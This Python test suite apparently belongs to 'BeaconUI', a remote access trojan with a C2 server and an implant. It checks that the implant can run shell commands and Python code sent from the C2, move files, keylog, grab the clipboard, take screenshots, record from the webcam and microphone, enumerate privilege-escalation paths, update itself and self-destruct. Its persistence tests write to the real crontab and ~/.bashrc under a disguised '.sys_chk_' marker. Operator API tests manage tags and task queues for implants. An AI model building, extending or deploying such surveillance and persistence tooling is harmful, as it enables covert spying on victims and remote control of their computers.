#!/usr/bin/python3

"""End-to-end + unit tests for the BeaconUI architecture.

Strategy:
  - Core tasks (execute, upload, download, set_interval, keylog_*, clipboard,
    persist, unpersist, privesc_enum, exec_python) are tested through the full
    beacon loop (C2 server in thread, implant in thread).
  - Destructive/process-replacing tasks (self_update, self_destruct) are tested
    as direct handler unit tests with the side-effects patched out.
  - Environment-sensitive tasks (screenshot, keylogger) are run and the result
    is accepted whether ok=True or ok=False with a clear error message.

Run:
    cd BeaconUI && source ../rat_venv/bin/activate
    python3 test_beacon.py
"""

import base64
import json
import os
import signal
import subprocess as _subprocess
import ssl
import sys
import tempfile
import threading
import time
import types
import unittest
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(__file__))

import c2_beacon
import implant_beacon


# ── Shared test infrastructure ─────────────────────────────────────────────────

def wait_for(condition, timeout=10, interval=0.05):
    """Poll until condition() returns a truthy value or timeout expires."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = condition()
        if result:
            return result
        time.sleep(interval)
    return None


_server_started = False
_test_implant_id = None
_test_port = 9446   # separate from operator (9444) and Beacon tests (9445)


def _start_infrastructure():
    """Start C2 + implant once for the whole test session."""
    global _server_started, _test_implant_id

    if _server_started:
        return _test_implant_id

    # Initialise SQLite (creates tables) using a temp db so tests stay isolated
    c2_beacon.DB_PATH = os.path.join(tempfile.gettempdir(), "test_c2_beacon.db")
    # Remove stale db from a previous run
    try:
        os.remove(c2_beacon.DB_PATH)
    except FileNotFoundError:
        pass
    c2_beacon._db_conn = None   # force new connection to the temp db
    c2_beacon._init_db()

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain(c2_beacon.SRV_CERT, c2_beacon.SRV_KEY)
    ssl_ctx.load_verify_locations(c2_beacon.CA_CERT)
    ssl_ctx.verify_mode = ssl.CERT_REQUIRED

    threading.Thread(
        target=lambda: c2_beacon.app.run(
            host="127.0.0.1", port=_test_port,
            ssl_context=ssl_ctx, use_reloader=False
        ),
        daemon=True,
    ).start()
    time.sleep(1)

    # Reset implant state — fast polling, no jitter for tests
    import uuid as _uuid
    implant_beacon.C2_URLS         = [f"https://localhost:{_test_port}"]
    implant_beacon.BEACON_INTERVAL = 0.2   # 200 ms check-ins
    implant_beacon.JITTER          = 0.0   # no randomisation — deterministic timing
    implant_beacon.IMPLANT_ID      = str(_uuid.uuid4())  # fresh UUID per run

    _known_id = implant_beacon.IMPLANT_ID  # capture before thread starts
    threading.Thread(target=implant_beacon.beacon_loop, daemon=True).start()

    found = wait_for(lambda: _known_id if _known_id in c2_beacon.implants else None, timeout=10)
    assert found, "Python implant did not register within 10 s"
    _test_implant_id = _known_id
    _server_started  = True
    return _test_implant_id


def _queue(task_type, payload):
    """Queue a task and wait for its result, then clear the store."""
    iid = _start_infrastructure()
    c2_beacon.result_store[iid].clear()
    c2_beacon.queue_task(iid, task_type, payload)

    def _got_result():
        return [r for r in c2_beacon.result_store.get(iid, [])
                if r.get("type") == task_type] or None

    results = wait_for(_got_result, timeout=15)
    c2_beacon.result_store[iid].clear()
    return results[0] if results else None


# ── Full-loop tests ────────────────────────────────────────────────────────────

class TestRegistration(unittest.TestCase):
    def test_implant_registers(self):
        iid = _start_infrastructure()
        self.assertIsNotNone(iid)
        info = c2_beacon.implants[iid]
        self.assertIn("hostname", info)
        self.assertIn("user",     info)
        self.assertIn("os",       info)
        print(f"  implant: {info['user']}@{info['hostname']} ({info['os']})")

    def test_implant_status_online(self):
        iid = _start_infrastructure()
        status = c2_beacon._implant_status(c2_beacon.implants[iid]["last_seen"])
        self.assertEqual(status, "online")


class TestCoreCommands(unittest.TestCase):
    def test_execute(self):
        r = _queue("execute", {"command": "echo hello_beacon"})
        self.assertIsNotNone(r, "no result returned")
        self.assertTrue(r["ok"])
        self.assertIn("hello_beacon", r["output"])

    def test_execute_stderr_merged(self):
        # execute handler always returns ok=True — non-zero exit codes just appear in output
        r = _queue("execute", {"command": "ls /nonexistent_path_xyz_12345"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertTrue(r["output"].strip(), "expected some stderr in output")

    def test_execute_timeout(self):
        # Patch timeout to 1 s for this test
        orig = implant_beacon.subprocess.run
        def fast_run(*a, **kw):
            if kw.get("timeout", 120) > 2:
                kw["timeout"] = 2
            return orig(*a, **kw)
        with patch.object(implant_beacon, "subprocess") as mock_sub:
            import subprocess as _sp
            mock_sub.run.side_effect = _sp.TimeoutExpired("sleep 60", 2)
            mock_sub.TimeoutExpired = _sp.TimeoutExpired
            mock_sub.shlex = implant_beacon.shlex
            r = implant_beacon.handle_execute({"command": "sleep 60"})
        self.assertFalse(r["ok"])
        self.assertIn("timed out", r["error"])

    def test_upload_and_verify(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            path = f.name
        try:
            data    = b"beacon upload test \xde\xad\xbe\xef"
            encoded = base64.b64encode(data).decode()
            r = _queue("upload", {"filename": path, "file": encoded})
            self.assertIsNotNone(r)
            self.assertTrue(r["ok"])
            with open(path, "rb") as fh:
                self.assertEqual(fh.read(), data)
        finally:
            os.unlink(path)

    def test_download(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(b"beacon download test")
            path = f.name
        try:
            r = _queue("download", {"filepath": path})
            self.assertIsNotNone(r)
            self.assertTrue(r["ok"])
            self.assertEqual(base64.b64decode(r["data"]), b"beacon download test")
        finally:
            os.unlink(path)

    def test_download_missing_file(self):
        r = _queue("download", {"filepath": "/nonexistent/file.txt"})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_set_interval(self):
        r = _queue("set_interval", {"interval": 2})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertEqual(implant_beacon.BEACON_INTERVAL, 2)
        # restore fast test polling
        implant_beacon.BEACON_INTERVAL = 0.2


class TestScreenshot(unittest.TestCase):
    def test_screenshot_returns_result(self):
        """Test handler directly — avoids blocking the beacon loop with slow deps."""
        r = implant_beacon.handle_screenshot({})
        self.assertIsNotNone(r)
        if r["ok"]:
            self.assertEqual(r["format"], "png")
            raw = base64.b64decode(r["data"])
            self.assertEqual(raw[:8], b"\x89PNG\r\n\x1a\n", "not a valid PNG")
            print(f"  screenshot: {len(raw):,} bytes PNG")
        else:
            self.assertIn("error", r)
            print(f"  screenshot skipped (no display/lib): {r['error']}")


class TestWebcam(unittest.TestCase):
    def test_webcam_snap(self):
        """webcam_snap with /dev/video0 — must return JPEG or clear error."""
        r = implant_beacon.handle_webcam_snap({"device": "/dev/video0"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"], f"webcam_snap failed: {r.get('error','')}")
        self.assertEqual(r["format"], "jpeg")
        raw = base64.b64decode(r["data"])
        self.assertEqual(raw[:2], b"\xff\xd8", f"not a valid JPEG (got {raw[:4].hex()})")
        print(f"  webcam_snap: {len(raw):,} bytes JPEG")

    def test_webcam_snap_bad_device(self):
        """Non-existent device must return ok=False with error string."""
        r = implant_beacon.handle_webcam_snap({"device": "/dev/video99"})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])
        self.assertIn("error", r)


class TestMicRecord(unittest.TestCase):
    def test_mic_record_1s(self):
        """1-second recording must return WAV bytes."""
        r = implant_beacon.handle_mic_record({"duration": 1, "device": "default"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"], f"mic_record failed: {r.get('error','')}")
        self.assertEqual(r["format"], "wav")
        self.assertEqual(r["duration"], 1)
        raw = base64.b64decode(r["data"])
        self.assertEqual(raw[:4], b"RIFF", f"not a valid WAV (got {raw[:4].hex()})")
        self.assertEqual(raw[8:12], b"WAVE")
        print(f"  mic_record: {len(raw):,} bytes WAV")

    def test_mic_record_bad_duration(self):
        """Duration 0 must return ok=False."""
        r = implant_beacon.handle_mic_record({"duration": 0})
        self.assertFalse(r["ok"])

    def test_mic_record_bad_duration_high(self):
        """Duration >300 must return ok=False."""
        r = implant_beacon.handle_mic_record({"duration": 999})
        self.assertFalse(r["ok"])


class TestKeylogger(unittest.TestCase):
    def test_keylogger_lifecycle(self):
        """start → dump (empty) → stop — must return results even if pynput absent."""
        r_start = _queue("keylog_start", {})
        self.assertIsNotNone(r_start)
        # ok=True (started) or ok=False (pynput missing) — both valid
        if r_start["ok"]:
            print("  keylogger: pynput available, started")
        else:
            self.assertIn("pynput", r_start["error"])
            print(f"  keylogger: {r_start['error']}")

        r_dump = _queue("keylog_dump", {})
        self.assertIsNotNone(r_dump)
        self.assertTrue(r_dump["ok"])   # dump always succeeds
        self.assertIn("output", r_dump)

        r_stop = _queue("keylog_stop", {})
        self.assertIsNotNone(r_stop)
        self.assertTrue(r_stop["ok"])

    def test_keylogger_double_start(self):
        """Starting twice should not error — second call reports 'already running' or starts fresh."""
        _queue("keylog_start", {})
        r = _queue("keylog_start", {})
        self.assertIsNotNone(r)
        _queue("keylog_stop", {})

    def test_keylog_dump_unit(self):
        """Direct unit test: buffer filled manually, then dumped."""
        with implant_beacon._keylog_lock:
            implant_beacon._keylog_buffer.extend(list("hello world"))
        r = implant_beacon.handle_keylog_dump({})
        self.assertTrue(r["ok"])
        self.assertEqual(r["output"], "hello world")
        # Buffer cleared after dump
        with implant_beacon._keylog_lock:
            self.assertEqual(implant_beacon._keylog_buffer, [])


class TestClipboard(unittest.TestCase):
    def test_clipboard_returns_result(self):
        """Clipboard grab — ok=True with content or ok=False with clear error."""
        r = _queue("clipboard", {})
        self.assertIsNotNone(r)
        if r["ok"]:
            self.assertIn("output", r)
            print(f"  clipboard: got {len(r['output'])} chars")
        else:
            self.assertIn("error", r)
            print(f"  clipboard unavailable: {r['error']}")


class TestPersistence(unittest.TestCase):
    def _script_in_crontab(self, script_path):
        import subprocess
        res = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        return script_path in res.stdout if res.returncode == 0 else False

    def test_persist_and_unpersist_crontab(self):
        r_install = _queue("persist", {"method": "crontab"})
        self.assertIsNotNone(r_install)
        self.assertTrue(r_install["ok"], f"persist failed: {r_install.get('error')}")
        script_path = os.path.abspath(implant_beacon.__file__)
        self.assertTrue(self._script_in_crontab(script_path),
                        "crontab entry not found after persist")

        # Second call should report already persisted
        r2 = _queue("persist", {"method": "crontab"})
        self.assertIsNotNone(r2)
        self.assertTrue(r2["ok"])
        self.assertIn("Already", r2["output"])

        # Unpersist
        r_remove = _queue("unpersist", {})
        self.assertIsNotNone(r_remove)
        self.assertTrue(r_remove["ok"])
        self.assertFalse(self._script_in_crontab(script_path),
                         "crontab entry still present after unpersist")

    def test_persist_and_unpersist_bashrc(self):
        bashrc = os.path.expanduser("~/.bashrc")
        script_path = os.path.abspath(implant_beacon.__file__)
        marker = f"# .sys_chk_{os.path.basename(script_path)}"

        r_install = _queue("persist", {"method": "bashrc"})
        self.assertIsNotNone(r_install)
        self.assertTrue(r_install["ok"], f"persist bashrc failed: {r_install.get('error')}")
        with open(bashrc) as f:
            content = f.read()
        self.assertIn(marker, content, "bashrc marker not found after persist")

        r_remove = _queue("unpersist", {})
        self.assertIsNotNone(r_remove)
        self.assertTrue(r_remove["ok"])
        with open(bashrc) as f:
            content = f.read()
        self.assertNotIn(marker, content, "bashrc marker still present after unpersist")


class TestPrivescEnum(unittest.TestCase):
    """Test handler directly — `find /` can block the beacon loop for >15 s."""

    def test_privesc_enum_sections(self):
        r = implant_beacon.handle_privesc_enum({})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        output = r["output"]
        for section in ["[ID]", "[SUDO]", "[SUID]", "[ENVIRONMENT]"]:
            self.assertIn(section, output, f"missing section {section}")
        print(f"  privesc output: {len(output)} chars, {output.count(chr(10))} lines")

    def test_privesc_includes_current_user(self):
        import getpass
        r = implant_beacon.handle_privesc_enum({})
        self.assertIsNotNone(r)
        self.assertIn(getpass.getuser(), r["output"])


class TestExecPython(unittest.TestCase):
    def test_exec_python_print(self):
        r = _queue("exec_python", {"code": "print('py_exec_ok')"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertIn("py_exec_ok", r["output"])

    def test_exec_python_multiline(self):
        code = "x = 6 * 7\nprint(f'result={x}')"
        r = _queue("exec_python", {"code": code})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertIn("result=42", r["output"])

    def test_exec_python_exception(self):
        r = _queue("exec_python", {"code": "raise ValueError('intentional')"})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])
        self.assertIn("intentional", r["error"])

    def test_exec_python_empty(self):
        r = _queue("exec_python", {"code": ""})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])

    def test_exec_python_no_output(self):
        r = _queue("exec_python", {"code": "x = 1 + 1"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertIn("no output", r["output"])


# ── Direct handler unit tests (destructive / process-replacing) ───────────────

class TestSelfUpdateUnit(unittest.TestCase):
    """Test self_update handler without actually replacing the script or re-execing."""

    def test_self_update_writes_file_and_schedules_reexec(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w") as f:
            f.write("# placeholder")
            tmp_path = f.name
        self.addCleanup(lambda: os.unlink(tmp_path) if os.path.exists(tmp_path) else None)

        new_code = b"# updated implant"
        encoded  = base64.b64encode(new_code).decode()

        # Patch execv to prevent actual re-execution.
        # Use addCleanup so the mock stays alive until after the daemon thread fires.
        execv_event = threading.Event()
        p_execv = patch.object(implant_beacon.os, "execv",
                               side_effect=lambda *_: execv_event.set())
        # Speed up the daemon delay so the test finishes fast
        p_sleep = patch.object(implant_beacon.time, "sleep", return_value=None)
        p_execv.start(); self.addCleanup(p_execv.stop)
        p_sleep.start(); self.addCleanup(p_sleep.stop)

        # Redirect abspath(__file__) → tmp_path for the duration of the call
        orig_file = implant_beacon.__file__
        implant_beacon.__file__ = tmp_path
        try:
            r = implant_beacon.handle_self_update({"payload": encoded})
        finally:
            implant_beacon.__file__ = orig_file

        self.assertTrue(r["ok"])
        self.assertIn("Script updated", r["output"])
        with open(tmp_path) as f:
            self.assertEqual(f.read(), "# updated implant")
        # Daemon thread fires immediately (sleep is mocked)
        called = execv_event.wait(timeout=3)
        self.assertTrue(called, "os.execv was never called by self_update thread")

    def test_self_update_bad_base64(self):
        r = implant_beacon.handle_self_update({"payload": "NOT_VALID_BASE64!!!"})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)


class TestSelfDestructUnit(unittest.TestCase):
    """Test self_destruct handler without actually deleting the script."""

    def test_self_destruct_returns_ok(self):
        destroy_event = threading.Event()
        removed = []
        exited  = []

        def _track_remove(p):
            removed.append(p)
            destroy_event.set()

        def _track_exit(c):
            exited.append(c)
            destroy_event.set()

        # Keep patches alive via addCleanup so they cover the daemon thread
        p_remove   = patch.object(implant_beacon.os, "remove",
                                  side_effect=_track_remove)
        p_exit     = patch.object(implant_beacon.sys, "exit",
                                  side_effect=_track_exit)
        p_unpersist = patch.object(implant_beacon, "handle_unpersist",
                                   return_value={"ok": True, "output": "mocked"})
        p_remove.start();   self.addCleanup(p_remove.stop)
        p_exit.start();     self.addCleanup(p_exit.stop)
        p_unpersist.start(); self.addCleanup(p_unpersist.stop)

        r = implant_beacon.handle_self_destruct({})

        self.assertTrue(r["ok"])
        self.assertIn("Self-destruct", r["output"])
        # Wait up to 5 s for the daemon thread to fire
        fired = destroy_event.wait(timeout=5)
        self.assertTrue(fired and (len(removed) > 0 or len(exited) > 0),
                        "neither os.remove nor sys.exit was called by destruct thread")


# ── C2 backend unit tests ──────────────────────────────────────────────────────

class TestC2Backend(unittest.TestCase):
    def test_implant_status_thresholds(self):
        from datetime import datetime, timezone, timedelta
        now = datetime.now(timezone.utc)

        recent  = (now - timedelta(seconds=30)).isoformat()
        idle    = (now - timedelta(seconds=120)).isoformat()
        old     = (now - timedelta(seconds=400)).isoformat()

        self.assertEqual(c2_beacon._implant_status(recent), "online")
        self.assertEqual(c2_beacon._implant_status(idle),   "idle")
        self.assertEqual(c2_beacon._implant_status(old),    "offline")
        self.assertEqual(c2_beacon._implant_status(None),   "offline")

    def test_queue_task_increments_counter(self):
        iid    = _start_infrastructure()
        before = c2_beacon.task_counter
        tid    = c2_beacon.queue_task(iid, "execute", {"command": "true"})
        self.assertEqual(tid, before + 1)
        # Clean up the queued (unexecuted) task
        c2_beacon.task_queues[iid].clear()

    def test_audit_log_written_on_queue(self):
        iid = _start_infrastructure()
        c2_beacon.queue_task(iid, "execute", {"command": "echo audit_test"})

        def _audit_present():
            with c2_beacon._db_lock:
                db   = c2_beacon._get_db()
                rows = db.execute(
                    "SELECT action FROM audit_log WHERE implant_id=? AND action='task_queued'",
                    (iid,)
                ).fetchall()
            return rows or None

        rows = wait_for(_audit_present, timeout=10)
        self.assertIsNotNone(rows, "no task_queued audit entries found within 10 s")
        c2_beacon.result_store[iid].clear()

    def test_result_stored_in_sqlite(self):
        iid = _start_infrastructure()
        c2_beacon.result_store[iid].clear()
        c2_beacon.queue_task(iid, "execute", {"command": "echo db_test"})

        def _row_present():
            with c2_beacon._db_lock:
                db  = c2_beacon._get_db()
                return db.execute(
                    "SELECT ok FROM results WHERE implant_id=? AND type='execute' LIMIT 1",
                    (iid,)
                ).fetchone()

        row = wait_for(_row_present, timeout=10)
        self.assertIsNotNone(row, "result not persisted to SQLite within 10 s")
        self.assertEqual(row["ok"], 1)
        c2_beacon.result_store[iid].clear()


# ── New task types (sysinfo, ps, ls, netstat, kill_process) ─────────────────────

class TestNewTaskTypes(unittest.TestCase):
    """Test the five new task handlers added to the Python implant."""

    def test_sysinfo(self):
        result = implant_beacon.handle_sysinfo({})
        self.assertTrue(result["ok"])
        out = result["output"]
        self.assertIn("Hostname:", out)
        self.assertIn("OS:", out)
        self.assertIn("User:", out)
        self.assertIn("Memory:", out)
        self.assertIn("PID:", out)

    def test_ps_returns_entries(self):
        result = implant_beacon.handle_ps({})
        self.assertTrue(result["ok"])
        self.assertEqual(result.get("format"), "ps")
        entries = result.get("entries", [])
        self.assertIsInstance(entries, list)
        self.assertGreater(len(entries), 0, "Expected at least 1 process")
        first = entries[0]
        self.assertIn("pid",  first)
        self.assertIn("user", first)
        self.assertIn("cmd",  first)

    def test_ls_current_dir(self):
        result = implant_beacon.handle_ls({"path": "."})
        self.assertTrue(result["ok"])
        self.assertEqual(result.get("format"), "ls")
        entries = result.get("entries", [])
        self.assertIsInstance(entries, list)
        names = [e["name"] for e in entries]
        # c2_beacon.py must be in . when running from BeaconUI/
        self.assertIn("c2_beacon.py", names)

    def test_ls_nonexistent_path(self):
        result = implant_beacon.handle_ls({"path": "/nonexistent_xyzzy_12345"})
        self.assertFalse(result["ok"])
        self.assertIn("error", result)

    def test_netstat(self):
        result = implant_beacon.handle_netstat({})
        # Accept ok or error (ss/netstat might not be installed in CI)
        self.assertIn("ok", result)
        if result["ok"]:
            self.assertIn("output", result)
            self.assertEqual(result.get("format"), "netstat")

    def test_kill_process_no_pid(self):
        result = implant_beacon.handle_kill_process({})
        self.assertFalse(result["ok"])
        self.assertIn("error", result)

    def test_kill_process_invalid_signal(self):
        # Sending SIGCONT (18) to ourselves should succeed
        result = implant_beacon.handle_kill_process({"pid": os.getpid(), "signal": 18})
        self.assertTrue(result["ok"])
        self.assertIn(str(os.getpid()), result["output"])


# ── New C2 API endpoints ──────────────────────────────────────────────────────────

class TestNewC2Endpoints(unittest.TestCase):
    """Test the new REST endpoints added to the operator Flask app."""

    def setUp(self):
        # Reuse the running test server; ensure implant is registered
        global _test_implant_id
        self.iid = _test_implant_id
        if not self.iid:
            self.skipTest("No test implant registered — run TestRegistration first")

    def _operator_client(self):
        from flask.testing import FlaskClient
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_results_history_endpoint(self):
        client = self._operator_client()
        resp = client.get(f"/api/results/{self.iid}/history")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIn("results", data)
        self.assertIn("total",   data)
        self.assertIn("page",    data)
        self.assertIsInstance(data["results"], list)

    def test_results_history_unknown_implant(self):
        client = self._operator_client()
        resp = client.get("/api/results/no-such-implant/history")
        self.assertEqual(resp.status_code, 404)

    def test_task_queue_endpoint(self):
        client = self._operator_client()
        resp = client.get(f"/api/task/{self.iid}/queue")
        self.assertEqual(resp.status_code, 200)
        self.assertIsInstance(resp.get_json(), list)

    def test_patch_implant_notes_and_tags(self):
        client = self._operator_client()
        resp = client.patch(
            f"/api/implants/{self.iid}",
            json={"notes": "test note", "tags": ["linux", "admin"]},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)
        self.assertTrue(resp.get_json()["ok"])
        # Verify in memory
        self.assertEqual(c2_beacon.implants[self.iid]["notes"], "test note")
        self.assertEqual(c2_beacon.implants[self.iid]["tags"],  ["linux", "admin"])

    def test_cancel_nonexistent_task(self):
        client = self._operator_client()
        resp = client.delete(f"/api/task/{self.iid}/99999")
        self.assertEqual(resp.status_code, 404)

    def test_cancel_queued_task(self):
        """Queue a task then cancel it before the implant picks it up."""
        client = self._operator_client()
        # Queue a task via the API
        resp = client.post(
            f"/api/task/{self.iid}",
            json={"type": "execute", "command": "sleep 999"},
            content_type="application/json",
        )
        self.assertTrue(resp.get_json()["ok"])
        task_id = resp.get_json()["task_id"]

        # Cancel it
        resp = client.delete(f"/api/task/{self.iid}/{task_id}")
        self.assertEqual(resp.status_code, 200)
        self.assertTrue(resp.get_json()["ok"])

        # Confirm removed from queue
        queue = client.get(f"/api/task/{self.iid}/queue").get_json()
        ids = [t["task_id"] for t in queue]
        self.assertNotIn(task_id, ids)

    def test_implant_list_has_notes_tags(self):
        client = self._operator_client()
        resp = client.get("/api/implants")
        implants = resp.get_json()
        our = next((i for i in implants if i["id"] == self.iid), None)
        self.assertIsNotNone(our)
        self.assertIn("notes", our)
        self.assertIn("tags",  our)


# ── Audit log endpoints ───────────────────────────────────────────────────────

class TestAuditEndpoints(unittest.TestCase):
    """Test the audit log REST endpoints."""

    def setUp(self):
        global _test_implant_id
        self.iid = _test_implant_id
        if not self.iid:
            self.skipTest("No test implant registered")

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_global_audit_returns_list(self):
        client = self._client()
        resp = client.get("/api/audit")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIsInstance(data, list)

    def test_global_audit_entry_shape(self):
        client = self._client()
        # Queue a task to guarantee at least one audit entry
        c2_beacon.queue_task(self.iid, "execute", {"command": "echo audit_shape"})
        resp = client.get("/api/audit")
        data = resp.get_json()
        self.assertGreater(len(data), 0, "expected at least one audit entry")
        entry = data[0]
        for key in ("timestamp", "implant_id", "action", "details"):
            self.assertIn(key, entry, f"audit entry missing key: {key}")
        c2_beacon.result_store[self.iid].clear()
        c2_beacon.task_queues[self.iid].clear()

    def test_per_implant_audit(self):
        client = self._client()
        resp = client.get(f"/api/audit/{self.iid}")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIsInstance(data, list)
        if data:
            self.assertEqual(data[0]["implant_id"], self.iid)

    def test_per_implant_audit_unknown(self):
        client = self._client()
        resp = client.get("/api/audit/no-such-implant")
        # Returns empty list for unknown implant (no 404 since it's just a filter)
        self.assertIn(resp.status_code, (200, 404))


# ── Results endpoint coverage ─────────────────────────────────────────────────

class TestResultsEndpoint(unittest.TestCase):
    """Test the /api/results/<id> and history endpoints more thoroughly."""

    def setUp(self):
        global _test_implant_id
        self.iid = _test_implant_id
        if not self.iid:
            self.skipTest("No test implant registered")

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_results_clears_on_read(self):
        """GET /api/results/<id> should return pending results and then clear them."""
        client = self._client()
        # Queue a task and wait for the result
        r = _queue("execute", {"command": "echo clear_test"})
        self.assertIsNotNone(r)
        # Now the store should already be cleared by _queue, but a direct GET
        # should return an empty list (nothing pending)
        resp = client.get(f"/api/results/{self.iid}")
        self.assertEqual(resp.status_code, 200)
        self.assertIsInstance(resp.get_json(), list)

    def test_results_unknown_implant(self):
        client = self._client()
        resp = client.get("/api/results/no-such-implant")
        self.assertEqual(resp.status_code, 404)

    def test_history_pagination(self):
        """History endpoint respects page + per_page parameters."""
        client = self._client()
        resp = client.get(f"/api/results/{self.iid}/history?page=1&per_page=5")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIn("results", data)
        self.assertLessEqual(len(data["results"]), 5)
        self.assertEqual(data["page"], 1)
        self.assertEqual(data["per_page"], 5)

    def test_history_page2_empty_when_few_results(self):
        """Page 2 with per_page=1000 should be empty if there aren't that many results."""
        client = self._client()
        resp = client.get(f"/api/results/{self.iid}/history?page=999&per_page=100")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIsInstance(data["results"], list)


# ── Queue task API edge cases ─────────────────────────────────────────────────

class TestQueueTaskAPI(unittest.TestCase):
    """Edge cases for the POST /api/task/<id> endpoint."""

    def setUp(self):
        global _test_implant_id
        self.iid = _test_implant_id
        if not self.iid:
            self.skipTest("No test implant registered")

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_queue_unknown_implant(self):
        client = self._client()
        resp = client.post(
            "/api/task/no-such-implant",
            json={"type": "execute", "command": "echo hi"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 404)

    def test_queue_missing_type(self):
        client = self._client()
        resp = client.post(
            f"/api/task/{self.iid}",
            json={"command": "echo hi"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 400)
        self.assertIn("error", resp.get_json())

    def test_queue_task_returns_task_id(self):
        client = self._client()
        resp = client.post(
            f"/api/task/{self.iid}",
            json={"type": "execute", "command": "echo queue_id_test"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data["ok"])
        self.assertIn("task_id", data)
        self.assertIsInstance(data["task_id"], int)
        # Clean up
        c2_beacon.task_queues[self.iid].clear()

    def test_task_queue_unknown_implant(self):
        client = self._client()
        resp = client.get("/api/task/no-such-implant/queue")
        self.assertEqual(resp.status_code, 404)

    def test_cancel_task_unknown_implant(self):
        client = self._client()
        resp = client.delete("/api/task/no-such-implant/1")
        self.assertEqual(resp.status_code, 404)


# ── PATCH implant edge cases ──────────────────────────────────────────────────

class TestPatchImplantEdgeCases(unittest.TestCase):
    """Edge cases for the PATCH /api/implants/<id> endpoint."""

    def setUp(self):
        global _test_implant_id
        self.iid = _test_implant_id
        if not self.iid:
            self.skipTest("No test implant registered")

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_patch_unknown_implant(self):
        client = self._client()
        resp = client.patch(
            "/api/implants/no-such-implant",
            json={"notes": "x"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 404)

    def test_patch_only_notes(self):
        client = self._client()
        resp = client.patch(
            f"/api/implants/{self.iid}",
            json={"notes": "only notes updated"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(c2_beacon.implants[self.iid]["notes"], "only notes updated")

    def test_patch_only_tags(self):
        client = self._client()
        resp = client.patch(
            f"/api/implants/{self.iid}",
            json={"tags": ["red", "team"]},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(c2_beacon.implants[self.iid]["tags"], ["red", "team"])

    def test_patch_tags_not_list_treated_as_empty(self):
        client = self._client()
        resp = client.patch(
            f"/api/implants/{self.iid}",
            json={"tags": "not-a-list"},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(c2_beacon.implants[self.iid]["tags"], [])

    def test_patch_empty_body_ok(self):
        client = self._client()
        resp = client.patch(
            f"/api/implants/{self.iid}",
            json={},
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 200)


# ── Direct handler unit tests: upload / download edge cases ──────────────────

class TestHandlerEdgeCases(unittest.TestCase):
    """Unit tests for implant handler edge cases."""

    def test_upload_bad_base64(self):
        r = implant_beacon.handle_upload({"filename": "/tmp/x", "file": "NOT!!VALID"})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_upload_missing_fields(self):
        r = implant_beacon.handle_upload({})
        self.assertFalse(r["ok"])

    def test_download_missing_filepath(self):
        r = implant_beacon.handle_download({})
        self.assertFalse(r["ok"])

    def test_set_interval_below_zero(self):
        orig = implant_beacon.BEACON_INTERVAL
        r = implant_beacon.handle_set_interval({"interval": 0})
        # Should either error or clamp — must not leave interval <= 0
        if not r["ok"]:
            self.assertIn("error", r)
        else:
            self.assertGreater(implant_beacon.BEACON_INTERVAL, 0)
        implant_beacon.BEACON_INTERVAL = orig

    def test_execute_empty_command(self):
        r = implant_beacon.handle_execute({"command": ""})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_sysinfo_has_pid(self):
        r = implant_beacon.handle_sysinfo({})
        self.assertTrue(r["ok"])
        self.assertIn(str(os.getpid()), r["output"])

    def test_ls_returns_type_field(self):
        r = implant_beacon.handle_ls({"path": "."})
        self.assertTrue(r["ok"])
        entries = r.get("entries", [])
        self.assertGreater(len(entries), 0)
        for e in entries:
            self.assertIn("type", e)
            # type chars: 'f'=file, 'd'=dir, 'l'=symlink, '?'=unreadable
            self.assertIn(e["type"], ("f", "d", "l", "?"))

    def test_kill_process_self_with_sigcont(self):
        """Sending SIGCONT (18) to ourself is a no-op but must succeed."""
        r = implant_beacon.handle_kill_process({"pid": os.getpid(), "signal": 18})
        self.assertTrue(r["ok"])

    def test_kill_process_nonexistent_pid(self):
